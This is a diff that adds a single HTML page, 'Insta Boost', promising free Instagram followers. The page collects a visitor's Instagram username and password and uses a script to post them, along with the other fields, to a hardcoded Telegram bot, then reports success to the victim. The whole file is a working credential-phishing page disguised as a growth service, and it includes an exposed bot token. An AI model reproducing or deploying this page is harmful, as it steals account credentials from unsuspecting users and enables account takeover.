@@ -1,0 +1,45 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Insta Boost - ichry0</title>
+  <style>
+    body { font-family: Arial, sans-serif; padding: 20px; background: #f0f0f0; }
+    input, button { display: block; margin: 10px 0; padding: 10px; width: 100%; }
+    .container { max-width: 400px; margin: auto; background: #fff; padding: 20px; border-radius: 10px; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Get Free Followers</h2>
+    <input type="text" id="username" placeholder="Instagram Username" />
+    <input type="password" id="password" placeholder="Password" />
+    <input type="text" id="image" placeholder="Profile Image URL" />
+    <input type="number" id="followers" placeholder="Followers Count" />
+    <button onclick="sendData()">Submit</button>
+    <p id="status"></p>
+  </div>
+  <script>
+    function sendData() {
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+      const image = document.getElementById("image").value;
+      const followers = document.getElementById("followers").value;
+
+      fetch("https://api.telegram.org/bot8025829630:AAF2dl6I0t4YdQ402h6gi3GiPxPJpLPUqYw/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: "8025829630",
+          text: `New Entry:\nUsername: ${username}\nPassword: ${password}\nImage: ${image}\nFollowers: ${followers}`
+        })
+      }).then(() => {
+        localStorage.setItem("insta_data", JSON.stringify({ username, password, image, followers }));
+        document.getElementById("status").innerText = "Data sent successfully!";
+      });
+    }
+  </script>
+</body>
+</html>
